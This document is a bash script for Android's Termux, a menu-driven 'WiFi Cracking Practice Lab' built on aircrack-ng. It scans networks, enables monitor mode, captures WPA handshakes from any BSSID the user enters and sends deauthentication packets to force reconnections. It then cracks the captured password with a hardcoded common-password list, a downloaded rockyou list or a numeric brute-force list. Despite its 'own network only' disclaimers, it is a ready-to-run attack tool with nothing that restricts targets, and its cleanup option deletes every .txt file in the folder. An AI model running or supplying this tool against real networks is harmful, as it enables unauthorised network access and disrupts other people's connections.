#!/data/data/com.termux/files/usr/bin/bash
# WiFi Cracking Tool - For Educational Purpose Only
# Only test on your own network!

echo ""
echo "========================================"
echo "    WiFi Cracking Practice Lab v1.0     "
echo "   For Educational & Testing Purpose    "
echo "========================================"
echo ""

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script requires root privileges!"
   echo "[+] Trying to get root access..."
   tsu
   if [[ $? -ne 0 ]]; then
      echo "[ERROR] Root access failed!"
      echo "[INFO] Some features may not work"
   fi
fi

# Update packages
echo "[+] Updating packages..."
pkg update -y && pkg upgrade -y

# Install required tools
echo "[+] Installing required tools..."
pkg install -y aircrack-ng termux-tools git python python2 curl wget tsu

# Download wordlists
echo "[+] Downloading wordlists..."
mkdir -p /sdcard/wifi-crack
cd /sdcard/wifi-crack

# Create custom wordlist with common passwords
echo "[+] Creating custom wordlist..."
cat > my_wordlist.txt << EOF
password
password123
12345678
123456789
1234567890
admin
admin123
wifi
wifi123
internet
indihome
telkom
1234
0000
qwerty
qwerty123
abc123
password1
iloveyou
letmein
welcome
monkey
dragon
baseball
football
mustang
superman
batman
harley
hockey
pokemon
shadow
master
sunshine
jordan
freedom
whatever
hello
secret
abcd1234
EOF

# Add your own password guesses
echo "yourpassword" >> my_wordlist.txt
echo "rumah123" >> my_wordlist.txt
echo "nama_router" >> my_wordlist.txt
echo "tanggal_lahir" >> my_wordlist.txt

echo "[+] Common wordlist created with $(wc -l my_wordlist.txt | awk '{print $1}') passwords"

# Function to scan networks
scan_networks() {
    echo ""
    echo "[1] Scanning for WiFi networks..."
    echo "[!] Make sure WiFi is enabled on your device"
    echo ""
    
    # Check wifi interface
    INTERFACE=$(ifconfig | grep wlan | cut -d: -f1 | head -1)
    if [ -z "$INTERFACE" ]; then
        INTERFACE="wlan0"
        echo "[INFO] Using default interface: $INTERFACE"
    else
        echo "[INFO] Found interface: $INTERFACE"
    fi
    
    # Start monitor mode
    echo "[+] Starting monitor mode..."
    airmon-ng check kill
    airmon-ng start $INTERFACE
    
    MON_INTERFACE="${INTERFACE}mon"
    if [ ! -d /sys/class/net/$MON_INTERFACE ]; then
        MON_INTERFACE=$INTERFACE
    fi
    
    # Scan for 30 seconds
    echo "[+] Scanning networks (30 seconds)..."
    timeout 30 airodump-ng $MON_INTERFACE --output-format csv -w scan
    
    echo ""
    echo "[2] Available Networks:"
    echo "========================================"
    
    if [ -f "scan-01.csv" ]; then
        # Display networks nicely
        echo "BSSID              | CH | RSSI | ENC  | ESSID"
        echo "-------------------+----+------+------+------"
        tail -n +2 scan-01.csv | grep -v 'Station' | head -20 | while IFS=, read -r bssid ch rssi speed privacy cipher auth power numbeacons iv lanip idlength essid key; do
            if [ ! -z "$essid" ] && [ ! -z "$bssid" ]; then
                printf "%-17s | %-2s | %-4s | %-5s | %s\n" "$bssid" "$ch" "$rssi" "$privacy" "$essid"
            fi
        done
    else
        echo "[ERROR] No networks found!"
        echo "[INFO] Try enabling WiFi or moving closer to router"
    fi
}

# Function to capture handshake
capture_handshake() {
    echo ""
    echo "[3] Handshake Capture"
    echo "========================================"
    
    read -p "Enter target BSSID: " BSSID
    read -p "Enter channel: " CHANNEL
    read -p "Enter capture filename: " CAPFILE
    
    echo "[+] Starting capture on channel $CHANNEL..."
    echo "[!] Press Ctrl+C when you see 'WPA handshake'"
    echo ""
    
    # Start capture
    xterm -bg black -fg white -geometry 100x30 -e "airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPFILE $MON_INTERFACE" &
    CAP_PID=$!
    
    echo "[+] Capture started (PID: $CAP_PID)"
    echo "[+] To trigger handshake:"
    echo "    1. Disconnect a device from the WiFi"
    echo "    2. Reconnect it"
    echo "    3. Or wait for automatic reconnection"
    
    read -p "Press Enter to send deauth packet (optional)... " dummy
    
    # Optional deauth
    echo "[+] Sending deauth packet..."
    aireplay-ng -0 2 -a $BSSID $MON_INTERFACE
    
    echo ""
    echo "[!] Let it run for 2-3 minutes"
    echo "[!] Check if 'WPA handshake' appears"
    read -p "Press Enter to stop capture... " dummy
    
    kill $CAP_PID 2>/dev/null
    airmon-ng stop $MON_INTERFACE
    
    # Check for handshake
    if aircrack-ng ${CAPFILE}-01.cap 2>/dev/null | grep -q "WPA handshake"; then
        echo "[SUCCESS] Handshake captured!"
        return 0
    else
        echo "[FAIL] No handshake captured"
        return 1
    fi
}

# Function to crack password
crack_password() {
    echo ""
    echo "[4] Password Cracking"
    echo "========================================"
    
    read -p "Enter capture filename: " CAPFILE
    
    echo "[+] Select wordlist:"
    echo "    1) Custom wordlist (my_wordlist.txt)"
    echo "    2) Common passwords"
    echo "    3) RockYou wordlist (need download)"
    echo "    4) Bruteforce numeric (0-99999999)"
    
    read -p "Choose option (1-4): " WORDLIST_OPT
    
    case $WORDLIST_OPT in
        1)
            WORDLIST="/sdcard/wifi-crack/my_wordlist.txt"
            ;;
        2)
            echo "[+] Creating common wordlist..."
            curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -o common.txt
            WORDLIST="common.txt"
            ;;
        3)
            echo "[+] Downloading rockyou.txt (might take time)..."
            if [ ! -f rockyou.txt ]; then
                curl -s https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt
            fi
            WORDLIST="rockyou.txt"
            ;;
        4)
            echo "[+] Creating numeric wordlist..."
            seq 0 99999999 > numeric.txt
            WORDLIST="numeric.txt"
            ;;
        *)
            WORDLIST="/sdcard/wifi-crack/my_wordlist.txt"
            ;;
    esac
    
    echo "[+] Starting crack with $WORDLIST..."
    echo "[!] This may take from minutes to days!"
    echo "[!] Press Ctrl+C to stop"
    echo ""
    
    time aircrack-ng -w $WORDLIST ${CAPFILE}-01.cap
    
    if [ $? -eq 0 ]; then
        echo ""
        echo "========================================"
        echo "[SUCCESS] PASSWORD FOUND!"
        echo "========================================"
    else
        echo ""
        echo "[FAIL] Password not found in wordlist"
        echo "[TIP] Try different wordlist or add more passwords"
    fi
}

# Function to test your own password strength
test_password() {
    echo ""
    echo "[5] Test Your Password Strength"
    echo "========================================"
    
    read -sp "Enter your WiFi password to test: " TEST_PASS
    echo ""
    
    # Check password strength
    LENGTH=${#TEST_PASS}
    HAS_UPPER=$(echo $TEST_PASS | grep -o '[A-Z]' | wc -l)
    HAS_LOWER=$(echo $TEST_PASS | grep -o '[a-z]' | wc -l)
    HAS_DIGIT=$(echo $TEST_PASS | grep -o '[0-9]' | wc -l)
    HAS_SPECIAL=$(echo $TEST_PASS | grep -o '[^A-Za-z0-9]' | wc -l)
    
    echo "[+] Password Analysis:"
    echo "    Length: $LENGTH characters"
    echo "    Uppercase: $HAS_UPPER"
    echo "    Lowercase: $HAS_LOWER"
    echo "    Digits: $HAS_DIGIT"
    echo "    Special: $HAS_SPECIAL"
    
    SCORE=0
    [ $LENGTH -ge 8 ] && SCORE=$((SCORE+1))
    [ $LENGTH -ge 12 ] && SCORE=$((SCORE+2))
    [ $HAS_UPPER -gt 0 ] && SCORE=$((SCORE+1))
    [ $HAS_LOWER -gt 0 ] && SCORE=$((SCORE+1))
    [ $HAS_DIGIT -gt 0 ] && SCORE=$((SCORE+1))
    [ $HAS_SPECIAL -gt 0 ] && SCORE=$((SCORE+2))
    
    echo ""
    echo "[+] Security Score: $SCORE/8"
    
    if [ $SCORE -le 3 ]; then
        echo "[WARNING] Very weak! Can be cracked in minutes"
    elif [ $SCORE -le 5 ]; then
        echo "[WARNING] Weak! Can be cracked in hours/days"
    elif [ $SCORE -le 7 ]; then
        echo "[GOOD] Strong! Hard to crack"
    else
        echo "[EXCELLENT] Very strong!"
    fi
    
    # Check if in common passwords
    if grep -qi "^$TEST_PASS$" my_wordlist.txt 2>/dev/null; then
        echo "[ALERT] Your password is in common password list!"
    fi
}

# Main menu
while true; do
    echo ""
    echo "========================================"
    echo "       WiFi Cracking Practice Lab       "
    echo "========================================"
    echo "1. Scan WiFi Networks"
    echo "2. Capture Handshake"
    echo "3. Crack Password"
    echo "4. Test Password Strength"
    echo "5. Create Custom Wordlist"
    echo "6. Cleanup Files"
    echo "7. Exit"
    echo ""
    
    read -p "Select option (1-7): " OPTION
    
    case $OPTION in
        1)
            scan_networks
            ;;
        2)
            capture_handshake
            ;;
        3)
            crack_password
            ;;
        4)
            test_password
            ;;
        5)
            nano /sdcard/wifi-crack/my_wordlist.txt
            echo "[+] Wordlist updated!"
            ;;
        6)
            rm -f scan-* *.cap *.csv *.txt 2>/dev/null
            echo "[+] Cleaned up!"
            ;;
        7)
            airmon-ng check kill
            echo "[+] Exiting... Remember: Only hack your own networks!"
            exit 0
            ;;
        *)
            echo "[ERROR] Invalid option!"
            ;;
    esac
    
    read -p "Press Enter to continue... " dummy
done
